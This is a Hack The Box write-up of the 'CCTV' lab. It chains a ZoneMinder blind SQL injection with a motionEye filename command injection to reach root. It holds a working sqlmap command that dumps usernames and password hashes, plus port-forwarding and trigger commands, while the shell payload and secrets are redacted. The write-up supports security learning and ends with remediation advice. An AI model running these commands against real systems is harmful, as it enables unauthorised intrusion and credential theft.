---
title: "CCTV: Chaining ZoneMinder SQL Injection and motionEye Command Injection"
description: "A time-based blind SQL injection in ZoneMinder recovers credential hashes for SSH access, then filename command injection in a root-run motionEye service leads to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - sql-injection
  - command-injection
---

## Summary

CCTV is an HTB Linux lab involving ZoneMinder and motionEye. The recorded path used a time-based blind SQL injection to recover credential hashes, then used recovered SSH access to reach a root-run internal motionEye service. Target addresses, account secrets, hashes, flags, and payload specifics are redacted.

## Context and Objective

Enumeration identified SSH and an HTTP service redirecting to a ZoneMinder installation. The notes identify ZoneMinder 1.37.63 and a time-based blind SQL injection in the `tid` parameter (CVE-2024-51482). The objective was to establish user access and assess the internal camera-management service for a privilege-escalation path.

## Approach and Evidence

### Identify exposed services

The recorded scan found SSH and HTTP. HTTP redirected to the ZoneMinder application path.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```text
22/tcp: SSH
80/tcp: HTTP (redirects to ZoneMinder)
```

### Extract credential hashes through blind SQL injection

The notes show authentication with documented default credentials followed by an automated request against `tid` that selected the `Username` and `Password` columns from ZoneMinder's `Users` table. The recorded output contained bcrypt hashes; one was cracked offline and provided SSH access to a non-privileged account.

```bash
sqlmap -u "http://<TARGET_HOST>/zm/index.php" \
  --data="request=event&action=removetag&id=1&tid=1" \
  --cookie="<SESSION_COOKIE>" \
  -p tid --dbms=mysql -D zm -T Users -C Username,Password \
  --dump --batch --threads 5 --time-sec=1
```

```text
Database: zm
Table: Users
... credential hashes recovered ...
```

```bash
ssh <LAB_USER>@<TARGET_HOST>
```

The notes report user-level access after offline password recovery. They do not provide a separate SSH session transcript.

### Find root-run motionEye service

From the user context, the notes probed internal ports and identified motionEye on port 7999. A service-status check recorded that motionEye ran as root.

```bash
for port in 7999 8765 9081; do
  curl -si http://127.0.0.1:$port 2>&1 | head -5
done
```

```text
Port 7999: Server: motionEye/0.43.1b4
User=root
```

### Trigger filename command injection

The notes identify CVE-2025-60787 in motionEye 0.43.1b4. Its web interface enforced Image File Name validation in client-side JavaScript only. After port forwarding to the internal interface, the recorded workflow bypassed that browser-side check, placed a shell-metacharacter payload in the filename field, and triggered snapshot capture. Payload details are omitted because they would be turnkey.

```bash
ssh -L <LOCAL_PORT>:127.0.0.1:<MOTIONEYE_PORT> <LAB_USER>@<TARGET_HOST> -N
curl http://127.0.0.1:<MOTIONEYE_PORT>/0/action/snapshot
```

```text
... snapshot request triggers configured filename handling ...
root shell reported by the notes
```

The notes report a root shell after capture. This demonstrates why browser-side validation cannot protect a server-side configuration value.

## Outcome

The recorded evidence establishes a chain from a ZoneMinder blind SQL injection to user SSH access and then root-level command execution through motionEye filename handling. Credential values, hashes, flags, target identifiers, and reverse-shell payload details are intentionally excluded.

## Lessons and Recommendations

- Update ZoneMinder and use parameterized queries for database-backed request parameters.
- Validate configuration input on the server, including filenames, and reject shell metacharacters rather than relying on browser-side checks.
- Run surveillance services with dedicated least-privilege accounts instead of root where device and configuration access permits.

## References

- Hack The Box, [CCTV](https://app.hackthebox.com/machines/CCTV) lab.
- CVE-2024-51482.
- CVE-2025-60787.
